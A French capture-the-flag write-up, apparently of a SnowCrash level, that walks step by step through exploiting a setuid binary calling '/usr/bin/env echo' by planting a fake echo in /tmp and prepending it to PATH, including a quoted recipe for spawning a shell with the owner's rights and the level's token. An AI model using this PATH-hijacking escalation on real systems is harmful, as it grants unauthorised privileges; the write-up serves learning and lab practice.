Je streamline ma procédure d'identification : 

```
$ id && pwd && ls -la
uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)
/home/user/level03
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

J'observe un fichier `level03`. Je pars du principe pour le moment que je vais y trouver la solution.

```
$ cat level03
ELF44   ($!444  TTT��(((��hhhDDP�td44Q�tdR�td��/lib/ld-linux.so.2GNUGNUOX�;�Sy8n�n��KT{K �K��3LD= T)␦__gmon_start__libc.��.6_IO_stdin_usedsetresgidsetresuidsystemgetegidgeteuid__libc_start_mainGLIBC_2.0ii
...
```

Rien de concret avec `cat`.
Je tente de l’exécuter :

```
$ ./level03
Exploit me
```

Je tente d'identifier le type du fichier avec `file` :

```
$ file level03
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

Je demande à [ChatGPT](https://chat.openai.com/share/77b4f5ef-f1f6-4bc1-bb14-fd57ccdbc8e4) de me faire une synthèse des différentes informations que je peux soutirer du résultat de cette commande. Il m'indique :

```
setuid setgid: 
This indicates that the executable has both the setuid (set user ID upon execution) and setgid (set group ID upon execution) permissions set. When such an executable is run, it operates with the permissions of the file's owner and group, rather than the permissions of the user running the file. This can lead to security vulnerabilities if the executable has flaws, as it might allow a normal user to perform actions with the elevated privileges of the file’s owner or group.
```

Puis :

```
Given these characteristics, if you're interested in exploring how to exploit this file, you would typically start by examining it with tools designed for binary analysis and debugging, such as `gdb` (GNU Debugger), `objdump`, or `strings` to look for vulnerabilities such as buffer overflows, format string vulnerabilities, or incorrect handling of user input.
```

Je vais donc tenter de voir comment je peux exploiter ce fichier avec `strings` :

```
$ strings level03
...
/usr/bin/env echo Exploit me
...
```

J'observe cette ligne: `/usr/bin/env echo Exploit me`

Cela signifie que le programme `level03` appelle le binaire `echo` pour print `Exploit me`.

Comme vu plus tôt avec `ls -la` :

```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

Le binaire `level03` est la propriété de `flag03`, et nous avons vu plus haut que le programme est exécuté avec `setuid` et `setgid` ce qui signifie que :

```
...
it operates with the permissions of the file's owner and group
...
```

Il faut donc que j'essaie de lancer la commande `getflag` au travers de ce binaire (puisque `flag03` à le droit de le faire). Etant donné que j'ai également besoin de voir le résultat, je devine que la ligne `echo` est un indice : 

C'est `echo` qu'il faut probablement exploiter, pour qu'il appelle `getflag`.

Je vais essayer de changer la partie `Exploit me` de :

```
$ strings level03
...
/usr/bin/env echo Exploit me
...
```

Qui se trouve dans le programme, pour que cette ligne appelle plutôt :

```
/usr/bin/env echo $(getflag)
```

---

Je ne trouve pas de solutions convaincante pour faire cette modification. En revanche, d'après cette discussion intitulée  [What is vulnerable about this C code?](https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code)

Je note que :

```
-> Rob Napier: `env` searches `PATH` to find `echo`
...
-> Black Mrx: well actually on the system function call you can mess with the `echo` command. for example if you execute the following code:

$ echo "/bin/bash" > /tmp/echo
$ chmod 777 /tmp/echo && export PATH=/tmp:$PATH

you will get a shell with the file owner permission
```

Je comprend donc d'où vient la vulnérabilité, ici :

```
$ strings level03
...
/usr/bin/env echo Exploit me
...
```

`/usr/bin/env` évalue l'environnement afin de trouver le binaire `echo`. Si je créé un faux binaire `echo` et que je l'ajoute au `PATH` (lors de l'exécution d'un binaire en bash, si le path du binaire n'est pas précisé, il est cherché dans `PATH`), au début de la variable `PATH`, alors ce sera mon `echo` qui sera appelé par le programme `level03`.

Suite aux conseils de `Black Mrx`, je tente de ré-écrire `echo` dans `/tmp` avec mon idée de solution plus haut :

```
$ echo $(getflag) > /tmp/echo
$ chmod +x /tmp/echo
$ export PATH=/tmp:$PATH
$ ./level03
/tmp/echo: 1: /tmp/echo: Syntax error: ")" unexpected
```

Je tente la même approche sans "$()" :

```
$ echo getflag > /tmp/echo
$ chmod +x /tmp/echo
$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```


 

